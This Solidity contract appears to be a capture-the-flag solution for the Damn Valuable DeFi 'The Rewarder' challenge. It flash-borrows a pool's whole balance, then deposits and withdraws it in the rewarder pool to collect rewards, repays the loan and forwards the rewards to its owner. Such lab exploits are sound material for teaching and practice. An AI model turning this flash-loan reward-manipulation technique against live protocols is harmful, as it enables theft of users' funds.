// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "./AccountingToken.sol";
import "./RewardToken.sol";
import "../DamnValuableToken.sol";
import "hardhat/console.sol";

contract AttackTheRewarder {
    
    address flashLoanerPool;
    address theRewarderPool;
    address rewardToken;
    address liquidity;
    address owner;

    constructor(address _flashLoanerPool, address _rewardToken, address _liquidity, address _theRewarderPool) {
        flashLoanerPool = _flashLoanerPool;
        rewardToken = _rewardToken;
        liquidity = _liquidity;
        theRewarderPool = _theRewarderPool;
        owner = msg.sender;
    }

    function attackTheRewarder() public {
        uint256 amount = DamnValuableToken(liquidity).balanceOf(flashLoanerPool);
        FlashLoanerPool(flashLoanerPool).flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) public {
        DamnValuableToken(liquidity).approve(theRewarderPool, amount);

        TheRewarderPool(theRewarderPool).deposit(amount);
        TheRewarderPool(theRewarderPool).withdraw(amount);

        DamnValuableToken(liquidity).transfer(flashLoanerPool, amount);

        uint256 rewardAmount = RewardToken(rewardToken).balanceOf(address(this));
        RewardToken(rewardToken).transfer(owner, rewardAmount);

    }

    
}